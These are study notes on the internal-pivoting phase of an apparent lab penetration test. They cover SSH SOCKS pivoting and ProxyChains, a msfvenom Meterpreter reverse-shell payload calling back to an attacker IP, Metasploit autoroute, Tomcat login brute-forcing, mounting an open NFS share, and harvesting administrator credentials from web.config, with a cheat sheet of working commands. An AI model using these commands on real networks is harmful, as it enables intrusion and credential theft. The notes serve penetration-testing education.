![Image](https://images.openai.com/static-rsc-4/xRraPuyiO-JSOyj6nKnIwQe8X95sRHZolOi_7lEKjbaBdMM92T0ZVoTCO6jT3SZ2oqbAaKJymE0UabhEUR7Hc4PGdI__WUR-8NAUfjm9kywHdmB4F8wn_Ex1YNhEBcLcP45HCHs--LIvIezpgRsaqRnEjeLmy2HEnn_AaP4rjDiB21nblMUZfdQEbCHdOcEl?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/gZBqcpsp8fAzPiQpfZn5R7cGEPcbGWdnp_MDk82osYB3Wgq-EUpBM-waEPndou8tS5RsIbQkynK3PsoPtTwBybGPkM4h9AGZTK7DaBgpF08i-JoPIuoRh3BVGIwBUWcUNxJZG8Qslh_4VdMBjP9QxkWjuc7SQehV8afjqIhvvPeLlnMbEp0qj9smR6Ux5KtT?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/-oMBR5olt5wfwHekHWnhegX_fv0hKP9aqZTl7E4HG-NxMXQVsrRcgKZdu1IqrolrgVbawDPrG8QbUjaq7JQNYW0fzztnaqMmNSYk7Bi4MzLHpbfdcjrf1gYhwXIWy0AYA3W0v5MG_C7AEt1fp_JztJ8kU1ml765VNAB-I9n9M2V9sZstEat-1LKarrngymyA?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/OpBXf404GdPiqDnsEYEYFGOCrJmP_ai_eyVQpjlkskp_ZpiuCwPo-PnVP0JZxe1K7gWvZ1IzUN3wok5OsOdSg5WwAmpXY4Ph0mZs6GFoG2DKQcwg1hnMxDZyHzH3g6zLwpNFbZCBIeeFaBmWVDq2J4jBHAAJtKvcpMk-EbolazlzZY1z_nNRoSfOoMO_A0y7?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/5UBBrzqIaBo3xCt1K9zTcDLxQWPXUoyMrTqjQgkZjhlrUzaJBhvhYw0k4zM5EJF11p1HWxqaqpO4RVcfDVgRSRPYz4aS9q7rMvtSK4Kt_d0y5SkRE0lXVKBNrqUtAVILCf8c5D6dYAQfA_lU0RfE6Y53_YKxzaWPlqml-XnkXsvv4_tpW_aP68mNOuBDc4oI?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/J6QTVYClVdSr7W-LxHpgtLddQl9wQuC1wvABCz7e3L_4Ls4FYOEzkcfz8cnyIlYd9TADjQIouo0Lbyi7vW8Owtl2ufOPwfC1QkBS_k8peGHQVZpX4GjiyE3Of6IcTjfAnq2TwtxfbYNR-0FuQfHLzB_KZuzHtOusNpb_0_e7kWi45QyWgmURVuHSOKbgKHnH?purpose=fullsize)

# INTERNAL INFORMATION GATHERING

## 1. Overview

At this stage of the penetration test, the assessment has already progressed significantly.

The key achievements described in the source are:

- External information gathering was performed.
    
- External port and service scanning was completed.
    
- Multiple services were enumerated for:
    
    - Misconfigurations
        
    - Known vulnerabilities
        
- **12 different web applications** were enumerated and attacked.
    
- Some web applications resulted in no access.
    
- Some provided:
    
    - File read access
        
    - Sensitive data access
        
- Some resulted in **remote code execution (RCE)** on the underlying web server.
    
- A foothold was obtained in the internal network.
    
- Pillaging and lateral movement were performed to obtain access as a more privileged user.
    
- Privileges were escalated to **root on the web server**.
    
- Persistence was established using:
    
    - A username/password combination
        
    - The root account's private SSH key
        

The next objective is to use this compromised host to investigate the internal network.

---

# 2. Internal Network Pivoting

## What is Pivoting?

**Pivoting** is the technique of using a compromised host as an intermediary to reach systems that are not directly accessible from the attacker's machine.

Example:

```text
Attacker
   |
   | Direct access
   v
DMZ01
10.129.203.111
   |
   | Internal network access
   v
172.16.8.0/23
   |
   +---- 172.16.8.3
   +---- 172.16.8.20
   +---- 172.16.8.50
   +---- 172.16.8.120
```

The compromised `dmz01` system has two important network interfaces:

```text
ens160 -> 10.129.203.111
ens192 -> 172.16.8.120
```

This makes `dmz01` an ideal pivot point into the internal `172.16.8.0/23` network.

---

# 3. SSH Dynamic Port Forwarding

The source uses the root `id_rsa` private key obtained from the compromised host.

The SSH command used is:

```bash
ssh -D 8081 -i dmz01_key root@10.129.203.111
```

## Command Breakdown

```text
ssh
```

Starts an SSH connection.

```text
-D 8081
```

Creates a **dynamic SOCKS proxy** listening on local port `8081`.

```text
-i dmz01_key
```

Uses the specified private SSH key.

```text
root@10.129.203.111
```

Connects to the compromised `dmz01` host as root.

### Important Concept

The attacker's machine can now send proxied traffic through:

```text
127.0.0.1:8081
```

and the SSH connection forwards that traffic through `dmz01`.

The source specifically states that this allows traffic from the attack host to reach hosts inside:

```text
172.16.8.0/23
```

---

# 4. Understanding the Network Interfaces

After logging into `dmz01`, the system information shows:

```text
IPv4 address for br-65c448355ed2: 172.18.0.1
IPv4 address for docker0: 172.17.0.1
IPv4 address for ens160: 10.129.203.111
IPv4 address for ens192: 172.16.8.120
```

The most important interface for internal pivoting is:

```text
ens192
172.16.8.120
```

because it belongs to the internal network.

### Important IPs

|Interface|IP|Purpose|
|---|---|---|
|ens160|`10.129.203.111`|External/DMZ-side connectivity|
|ens192|`172.16.8.120`|Internal network|
|docker0|`172.17.0.1`|Docker network|
|br-65c448355ed2|`172.18.0.1`|Container bridge|

---

# 5. Confirming the SOCKS Listener

After starting SSH dynamic forwarding, verify that port `8081` is listening:

```bash
netstat -antp | grep 8081
```

Expected result:

```text
tcp        0      0 127.0.0.1:8081
0.0.0.0:*          LISTEN
```

and:

```text
tcp6       0      0 ::1:8081
```

### What this proves

A local SOCKS listener has been established on:

```text
127.0.0.1:8081
```

The SSH process is responsible for that listener.

---

# 6. Configuring ProxyChains

The next step is to tell ProxyChains to use the SOCKS proxy.

Edit:

```bash
/etc/proxychains.conf
```

The relevant configuration is:

```text
socks4 127.0.0.1 8081
```

The source shows:

```bash
grep socks4 /etc/proxychains.conf
```

Output:

```text
#       socks4  192.168.1.49    1080
#       proxy types: http, socks4, socks5
socks4  127.0.0.1 8081
```

### Traffic Flow

```text
Nmap / curl / other tool
          |
          v
     ProxyChains
          |
          v
  127.0.0.1:8081
          |
       SSH SOCKS
          |
          v
       dmz01
          |
          v
  172.16.8.0/23
```

---

# 7. Testing the SSH Pivot with Nmap

The source tests connectivity to the second NIC of `dmz01`:

```bash
proxychains nmap -sT -p 21,22,80,8080 172.16.8.120
```

Results:

```text
PORT     STATE SERVICE

21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy
```

This confirms that ProxyChains is successfully sending traffic through the pivot.

### Important

The source uses:

```text
-sT
```

which performs a TCP connect scan.

When using ProxyChains, TCP connect scanning is useful because the traffic must traverse the proxy.

---

# 8. Metasploit-Based Pivoting

The source also demonstrates an alternative pivoting method using Metasploit.

The overall process is:

```text
Generate payload
      ↓
Transfer payload to dmz01
      ↓
Start Metasploit handler
      ↓
Execute payload
      ↓
Receive Meterpreter session
      ↓
Configure routing
      ↓
Enumerate internal network
```

---

# 9. Creating the Meterpreter Payload

The source creates a Linux x86 Meterpreter reverse TCP payload:

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp \
LHOST=10.10.14.15 \
LPORT=443 \
-f elf > shell.elf
```

Important parameters:

|Parameter|Meaning|
|---|---|
|`-p`|Payload|
|`linux/x86/meterpreter/reverse_tcp`|Linux x86 Meterpreter reverse TCP|
|`LHOST`|Listener/attacker IP|
|`LPORT`|Listener port|
|`-f elf`|ELF output format|
|`> shell.elf`|Save payload as `shell.elf`|

The resulting ELF file was:

```text
207 bytes
```

---

# 10. Transferring the Payload Using SCP

Because SSH access is available, the source transfers the file using:

```bash
scp -i dmz01_key shell.elf root@10.129.203.111:/tmp
```

The payload is placed in:

```text
/tmp
```

on `dmz01`.

---

# 11. Setting Up Metasploit Multi/Handler

Inside Metasploit:

```text
use exploit/multi/handler
```

Then:

```text
set payload linux/x86/meterpreter/reverse_tcp
```

Set the listener:

```text
set lhost 10.10.14.15
set LPORT 443
```

Then:

```text
exploit
```

Expected:

```text
Started reverse TCP handler on 10.10.14.15:443
```

---

# 12. Executing the Payload

On `dmz01`:

```bash
chmod +x shell.elf
```

Then:

```bash
./shell.elf
```

The Meterpreter handler receives the connection.

The source shows:

```text
Meterpreter session 1 opened
```

Then:

```text
getuid
```

returns:

```text
Server username: root
```

Therefore, the Meterpreter session is running as root.

---

# 13. Metasploit Autoroute

After obtaining the Meterpreter session, the source backgrounds it:

```text
background
```

Then:

```text
use post/multi/manage/autoroute
```

View options:

```text
show options
```

Important options include:

```text
SESSION
SUBNET
NETMASK
CMD
```

Set:

```text
set SESSION 1
```

and:

```text
set subnet 172.16.8.0
```

Then:

```text
run
```

The module discovers routes including:

```text
10.129.0.0/16
172.16.0.0/16
172.17.0.0/16
172.18.0.0/16
```

### Important Concept

`autoroute` allows Metasploit to understand and use routes available through the compromised host.

---

# 14. Host Discovery Through Metasploit

Once routing is configured, the source uses:

```text
post/multi/gather/ping_sweep
```

View options:

```text
show options
```

Set:

```text
set rhosts 172.16.8.0/23
set SESSION 1
run
```

The scan discovers:

```text
172.16.8.3
172.16.8.20
172.16.8.50
172.16.8.120
```

### Discovered Hosts

|IP|Status|
|---|---|
|`172.16.8.3`|Host found|
|`172.16.8.20`|Host found|
|`172.16.8.50`|Host found|
|`172.16.8.120`|Pivot host|

---

# 15. Host Discovery Using SSH

The source also demonstrates a simple Bash-based ping sweep from `dmz01`:

```bash
for i in $(seq 254); do ping 172.16.8.$i -c1 -W1 & done | grep from
```

Results included:

```text
172.16.8.3
172.16.8.20
172.16.8.120
172.16.8.50
```

### Important Observation

The source notes that Nmap through ProxyChains can perform host discovery, but it may be considerably slower.

Therefore, when you already have shell access to a pivot host, local discovery techniques can sometimes provide faster results.

---

# 16. Internal Network Map

Based on the source:

```text
                 ATTACKER
              10.10.14.15
                    |
                    |
              SSH / SOCKS
                    |
                    v
          +-------------------+
          |      DMZ01        |
          | 10.129.203.111    |
          | 172.16.8.120      |
          +-------------------+
                    |
                    |
              INTERNAL LAN
              172.16.8.0/23
                    |
       +------------+------------+------------+
       |            |            |            |
       v            v            v            v
   .8.3          .8.20        .8.50        .8.120
     |              |            |             |
     |              |            |             |
     AD/DC          DNN         Tomcat        DMZ01
```

---

# 17. Internal Host Enumeration

The source uses a static Nmap binary on `dmz01`.

Command:

```bash
./nmap --open -iL live_hosts
```

The scan identifies three additional hosts.

---

# 18. Host: 172.16.8.3

Open ports:

```text
53/tcp   open domain
88/tcp   open kerberos
135/tcp  open epmap
139/tcp  open netbios-ssn
389/tcp  open ldap
445/tcp  open microsoft-ds
464/tcp  open kpasswd
593/tcp  open unknown
636/tcp  open ldaps
```

### Identification

The combination of:

```text
Kerberos
LDAP
SMB
LDAPS
```

strongly indicates that:

```text
172.16.8.3
```

is a **Domain Controller**.

The source chooses to leave it aside temporarily and investigate other hosts.

---

# 19. Host: 172.16.8.20

Open ports:

```text
80/tcp    open http
111/tcp   open sunrpc
135/tcp   open epmap
139/tcp   open netbios-ssn
445/tcp   open microsoft-ds
2049/tcp  open nfs
3389/tcp  open ms-wbt-server
```

Important services:

```text
HTTP
NFS
SMB
RDP
RPC
```

The particularly interesting ports identified in the source are:

```text
80
2049
```

---

# 20. Host: 172.16.8.50

Open ports:

```text
135/tcp  open epmap
139/tcp  open netbios-ssn
445/tcp  open microsoft-ds
3389/tcp open ms-wbt-server
8080/tcp open http-alt
```

Port `8080` is particularly interesting because it is a non-standard HTTP port.

Further enumeration identifies **Tomcat** running there.

---

# 21. Quick Host Enumeration Summary

|Host|Important Ports|Identification / Interest|
|---|---|---|
|`172.16.8.3`|53, 88, 389, 445, 636|Domain Controller|
|`172.16.8.20`|80, 2049, 3389|DNN + NFS|
|`172.16.8.50`|445, 3389, 8080|Tomcat|
|`172.16.8.120`|21, 22, 80, 8080|DMZ01 / pivot host|

---

# 22. Active Directory — SMB NULL Session

The source checks whether the Domain Controller allows SMB NULL sessions.

Command:

```bash
proxychains enum4linux -U -P 172.16.8.3
```

A NULL session means attempting access without supplying normal credentials.

The source obtains:

```text
Domain Name: INLANEFREIGHT
```

and:

```text
Domain SID:
S-1-5-21-2814148634-3729814499-1637837074
```

The output confirms:

```text
Host is part of a domain
```

However, user enumeration fails:

```text
NT_STATUS_ACCESS_DENIED
```

Password policy enumeration also fails.

The SMB NULL share attempt ultimately fails with:

```text
STATUS_ACCESS_DENIED
```

### Conclusion

The SMB NULL session investigation is a:

```text
DEAD END
```

No useful user list or password policy is obtained.

---

# 23. Why Password Policy Matters

The source explains that if a password policy and user list could be obtained, a penetration tester could understand account-lockout constraints before conducting credential attacks.

The source mentions techniques such as:

- Password spraying
    
- Kerbrute username enumeration
    
- ASREPRoasting
    

### Important

The objective during an authorized penetration test is to understand the environment and avoid unnecessary account lockouts.

---

# 24. 172.16.8.50 — Tomcat

Port:

```text
8080/tcp
```

is identified as Tomcat.

The source observes that the host appears to be running:

```text
Tomcat 10
```

No public exploit is identified in the material.

The next test is the Tomcat Manager login.

Metasploit can be launched through ProxyChains:

```bash
proxychains msfconsole
```

Then:

```text
use auxiliary/scanner/http/tomcat_mgr_login
```

Set:

```text
set rhosts 172.16.8.50
set stop_on_success true
run
```

The module attempts credentials such as:

```text
admin:admin
admin:manager
admin:role1
tomcat:changethis
```

The attempts fail.

### Result

No successful Tomcat Manager login is obtained.

The source therefore treats this path as another:

```text
DEAD END
```

---

# 25. Tomcat — Pentest Significance

The source makes an important distinction between external and internal exposure.

If a Tomcat Manager login is exposed to the internet, it may represent an important finding because weak credentials could potentially provide a path to a foothold.

On an internal network, merely discovering Tomcat Manager is not necessarily enough to report a critical issue.

The source emphasizes that a stronger finding would require something such as:

```text
Weak credentials
      ↓
Tomcat Manager access
      ↓
Ability to upload JSP web shell
      ↓
Potential code execution
```

---

# 26. 172.16.8.20 — DotNetNuke (DNN)

The HTTP service on:

```text
172.16.8.20:80
```

is identified as:

**DotNetNuke (DNN)**

DNN is a CMS written in .NET.

The source compares it conceptually to WordPress in the .NET ecosystem.

The source notes that DNN has had critical vulnerabilities historically and contains functionality worth investigating.

---

# 27. Accessing DNN Through the SOCKS Proxy

The source demonstrates using:

```bash
proxychains curl http://172.16.8.20
```

The response identifies DNN.

The tester can also configure Firefox to use:

```text
SOCKS Host: 127.0.0.1
Port: 8081
SOCKS version: 5
```

This allows browser traffic to travel through the SSH SOCKS tunnel.

![Image](https://images.openai.com/static-rsc-4/JMrVQ_iNHQzI95W8dD2MxLM3tLklornGB7xMTi_Iaz7lg0v8Cr7df4s3st6n2HZok7mfHYukk2XWGaxXhT5No15es3czZOjgd35hqaU5DTKUC79nds-1B-7rt2Jl5ZLg0z5egNtfVRY5jFK-9KRKv5txSBXr_K6upuWVbfIXdX3UCgzMrx4zX6gxyQWjHAbJ?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/gl5Q7fegHC2WAYA-FGjGRXefM6bcMfPBHLzK4tfozlALWSRpGqqq4nq78cuBAQVmmoVQjkeHIrp3Eqc0hz5migctDxfvyODO2b6-t3XFaL_biGLHargD7kVs9bcUnUVJdDQVcIWgMupU_Wjl3dWgWUPOUyHb3bqDlOr79mHoCIAV9gZUsbd8GJtY-ekgzz31?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/7cZQsIUVzVX5OSQZMucGOASFyjFq-hf9SASb6DLXPE3tSK5WPT7ct2Z2VZa1quc6KhveUeV6sNNoDis7YdFFFmHzMLBayc1iu9QojZSgTpCP_I7LWg2XEpCjfZhyFn2mZta_vyS-MugIFK4id3zwzHbJLElmRHiI2Y4b07ArY40pl1KgCo-etnnXpk0yInaR?purpose=fullsize)

---

# 28. DNN Login and Registration

The following URL is identified:

```text
http://172.16.8.20/Login?returnurl=%2fadmin
```

This provides access to the DNN administrative login page.

A user registration page is also available.

An attempted registration produces a message indicating that:

```text
An email with your details has been sent to the Site Administrator for verification.
```

The source considers approval of an unknown registration unlikely, so the investigation moves toward another service.

---

# 29. NFS Enumeration

Port:

```text
2049/tcp
```

is running NFS.

### Why NFS Is Interesting

Misconfigured NFS shares can expose:

- Application files
    
- Configuration files
    
- Source code
    
- Credentials
    
- Sensitive data
    

The source specifically considers NFS interesting because:

```text
172.16.8.20
```

appears to be a development server.

---

# 30. Enumerating NFS Exports

The command used:

```bash
proxychains showmount -e 172.16.8.20
```

Output:

```text
Export list for 172.16.8.20:

/DEV01 (everyone)
```

This is an important discovery.

The export:

```text
/DEV01
```

is accessible to:

```text
everyone
```

---

# 31. Mounting the NFS Share

The source notes that the NFS share cannot be mounted through ProxyChains.

However, because root access exists on `dmz01`, the tester can mount it from the pivot host.

Create a mount point:

```bash
mkdir DEV01
```

Mount the share:

```bash
mount -t nfs 172.16.8.20:/DEV01 /tmp/DEV01
```

Then:

```bash
cd DEV01/
```

and:

```bash
ls
```

The directory contains:

```text
BuildPackages.bat
CKToolbarButtons.xml
CKToolbarSets.xml
CKEditorDefaultSettings.xml
DNN/
WatchersNET.CKEditor.sln
```

---

# 32. Pillaging Configuration Files

The `DNN` directory is particularly interesting.

Entering it:

```bash
cd DNN
```

reveals:

```text
web.config
```

among many other application files.

### Why `web.config` Matters

Configuration files frequently contain sensitive information such as:

- Database credentials
    
- Application credentials
    
- API keys
    
- Connection strings
    
- Administrator information
    

Therefore, configuration files should be considered high-value targets during authorized penetration testing.

---

# 33. Credential Discovery in web.config

The source shows:

```bash
cat web.config
```

and finds:

```xml
<username>Administrator</username>
<password>
    <value>D0tn31Nuk3R0ck$$@123</value>
</password>
```

Therefore, the discovered DNN administrator credentials are:

```text
Username:
Administrator

Password:
D0tn31Nuk3R0ck$$@123
```

### IMPORTANT

This is one of the most significant findings in this section because the credentials were obtained through:

```text
Internal pivot
      ↓
NFS enumeration
      ↓
Open NFS export
      ↓
Mount /DEV01
      ↓
Application source/configuration
      ↓
web.config
      ↓
Administrator credentials
```

The source concludes this section by indicating that these DNN credentials will be used for the next stage of the assessment.

---

# 34. Network Traffic Capture

Because root access exists on `dmz01`, the tester can also perform packet capture.

Tool:

```text
tcpdump
```

The source emphasizes that capturing network traffic can sometimes reveal:

- Cleartext credentials
    
- Network information
    
- Host communication
    
- Other useful information
    

This can be particularly useful during an internal penetration test.

---

# 35. tcpdump Command

The source uses:

```bash
tcpdump -i ens192 -s 65535 -w ilfreight_pcap
```

### Breakdown

```text
-i ens192
```

Capture traffic on:

```text
ens192
```

which is the internal interface.

```text
-s 65535
```

Sets the snapshot length to capture the full packet size.

```text
-w ilfreight_pcap
```

Writes the packet capture to:

```text
ilfreight_pcap
```

---

# 36. Packet Capture Result

The capture produced:

```text
2027 packets captured
2033 packets received by filter
0 packets dropped by kernel
```

The resulting capture can then be transferred to the attacker's machine and analyzed with:

```text
Wireshark
```

The source reports that in this particular environment:

```text
nothing useful was captured
```

However, on a busier user VLAN or another active network segment, packet capture could potentially reveal significant information.

---

# 37. Wireshark Analysis

The workflow is:

```text
tcpdump
   |
   v
Packet capture
   |
   v
Transfer .pcap
   |
   v
Wireshark
   |
   v
Analyze:
- Credentials
- Protocols
- Hosts
- Sessions
- Network behavior
```

The source notes that some testers may capture traffic continuously, while others may perform periodic captures during the early stages of an internal assessment.

---

# 38. Investigation Flow

The entire section can be remembered as:

```text
ROOT ON DMZ01
      |
      v
SSH Dynamic Port Forwarding
      |
      v
SOCKS Proxy :8081
      |
      v
ProxyChains
      |
      v
Internal Network Discovery
      |
      +-----------------------------+
      |                             |
      v                             v
Metasploit Pivot               SSH Pivot
      |                             |
      v                             v
Autoroute                     ProxyChains
      |                             |
      +-------------+---------------+
                    |
                    v
            172.16.8.0/23
                    |
       +------------+------------+
       |            |            |
       v            v            v
    .8.3          .8.20        .8.50
      |             |             |
      v             v             v
     AD            DNN          Tomcat
                   |
                   v
                  NFS
                   |
                   v
             /DEV01 (everyone)
                   |
                   v
              DNN directory
                   |
                   v
               web.config
                   |
                   v
        Administrator credentials
```

---

# 39. Important Commands Cheat Sheet

## SSH Pivot

```bash
ssh -D 8081 -i dmz01_key root@10.129.203.111
```

## Verify SOCKS Listener

```bash
netstat -antp | grep 8081
```

## ProxyChains Configuration

```text
socks4 127.0.0.1 8081
```

## Nmap Through ProxyChains

```bash
proxychains nmap -sT -p 21,22,80,8080 172.16.8.120
```

## Generate Meterpreter Payload

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.15 LPORT=443 -f elf > shell.elf
```

## Transfer Payload

```bash
scp -i dmz01_key shell.elf root@10.129.203.111:/tmp
```

## Make Executable

```bash
chmod +x shell.elf
```

## Execute

```bash
./shell.elf
```

## Metasploit Handler

```text
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set lhost 10.10.14.15
set LPORT 443
exploit
```

## Autoroute

```text
use post/multi/manage/autoroute
set SESSION 1
set subnet 172.16.8.0
run
```

## Ping Sweep

```text
use post/multi/gather/ping_sweep
set rhosts 172.16.8.0/23
set SESSION 1
run
```

## Bash Ping Sweep

```bash
for i in $(seq 254); do ping 172.16.8.$i -c1 -W1 & done | grep from
```

## Internal Nmap

```bash
./nmap --open -iL live_hosts
```

## SMB Enumeration

```bash
proxychains enum4linux -U -P 172.16.8.3
```

## Tomcat Scanner

```text
use auxiliary/scanner/http/tomcat_mgr_login
set rhosts 172.16.8.50
set stop_on_success true
run
```

## DNN Enumeration

```bash
proxychains curl http://172.16.8.20
```

## NFS Enumeration

```bash
proxychains showmount -e 172.16.8.20
```

## Mount NFS

```bash
mkdir DEV01
mount -t nfs 172.16.8.20:/DEV01 /tmp/DEV01
```

## View Files

```bash
cd /tmp/DEV01
ls
```

## Read Configuration

```bash
cd DNN
cat web.config
```

## Packet Capture

```bash
tcpdump -i ens192 -s 65535 -w ilfreight_pcap
```

---

# 40. Key Findings to Remember

### Finding 1 — Compromised Pivot Host

`dmz01` provides access to the internal network through:

```text
ens192
172.16.8.120
```

### Finding 2 — SSH Dynamic Port Forwarding

A SOCKS proxy is created on:

```text
127.0.0.1:8081
```

### Finding 3 — Internal Network

The main internal subnet is:

```text
172.16.8.0/23
```

### Finding 4 — Domain Controller

```text
172.16.8.3
```

is identified as a Domain Controller because of services including:

```text
Kerberos
LDAP
SMB
LDAPS
```

### Finding 5 — SMB NULL Session

The NULL session check does not provide useful user or password-policy information.

Result:

```text
STATUS_ACCESS_DENIED
```

### Finding 6 — Tomcat

```text
172.16.8.50:8080
```

runs Tomcat, but the tested Manager credentials fail.

### Finding 7 — DNN

```text
172.16.8.20:80
```

runs DotNetNuke.

### Finding 8 — Open NFS Export

```text
/DEV01 (everyone)
```

is exposed through NFS.

### Finding 9 — Sensitive Configuration

The NFS share contains the DNN application and:

```text
web.config
```

contains administrator credentials.

### Finding 10 — Packet Capture

`tcpdump` can be used on:

```text
ens192
```

to capture internal network traffic.

---

# 41. Exam / Interview Concepts

## What is pivoting?

Using a compromised host to access another network or systems that are not directly reachable from the attacker's machine.

## What is dynamic port forwarding?

SSH dynamic port forwarding creates a SOCKS proxy through which applications can send traffic via the SSH-connected host.

## What is ProxyChains?

ProxyChains forces supported applications to send network connections through configured proxy servers.

## Why is 172.16.8.3 likely a Domain Controller?

Because it exposes services associated with Active Directory, especially:

```text
Kerberos
LDAP
SMB
LDAPS
```

## Why is NFS interesting?

A poorly configured NFS export may expose application files, source code, configuration files, or credentials.

## Why are web.config files important?

They can contain sensitive application configuration, including credentials and connection information.

## Why use tcpdump?

To capture network traffic that may contain useful information such as protocol activity, hosts, or potentially cleartext data.

## What was the major credential discovery path?

```text
NFS
  ↓
/DEV01
  ↓
DNN source/application files
  ↓
web.config
  ↓
Administrator credentials
```

---

# 42. Final Attack/Enumeration Chain

The most important sequence from this section is:

```text
Existing Root Access
        ↓
DMZ01
        ↓
Identify Internal NIC
172.16.8.120
        ↓
SSH Dynamic Port Forwarding
        ↓
SOCKS :8081
        ↓
ProxyChains
        ↓
Internal Host Discovery
        ↓
172.16.8.3
172.16.8.20
172.16.8.50
        ↓
Service Enumeration
        ↓
AD / SMB
DNN / NFS
Tomcat
        ↓
Tomcat → Dead End
SMB NULL → Dead End
        ↓
NFS /DEV01
        ↓
DNN Application Files
        ↓
web.config
        ↓
Administrator Credentials
        ↓
Continue DNN Attack Path
```

## Core Lesson

The most important lesson from this section is that **internal penetration testing is not limited to finding an obvious exploit**.

A tester should systematically:

1. Identify pivot opportunities.
    
2. Establish access to internal networks.
    
3. Discover live hosts.
    
4. Enumerate services.
    
5. Prioritize interesting services.
    
6. Investigate configuration and file shares.
    
7. Perform careful pillaging.
    
8. Identify credentials and sensitive information.
    
9. Re-evaluate newly discovered credentials against relevant services.
    
10. Continue the attack path based on evidence.
    

The source ends this section after obtaining the DNN administrator credentials from the `web.config` file and moves toward using those credentials in the next stage.

The two biggest things to memorize from this section are **the pivoting workflow** (`SSH → SOCKS → ProxyChains → internal enumeration`) and **the NFS-to-credentials chain** (`NFS → /DEV01 → DNN → web.config → Administrator credentials`).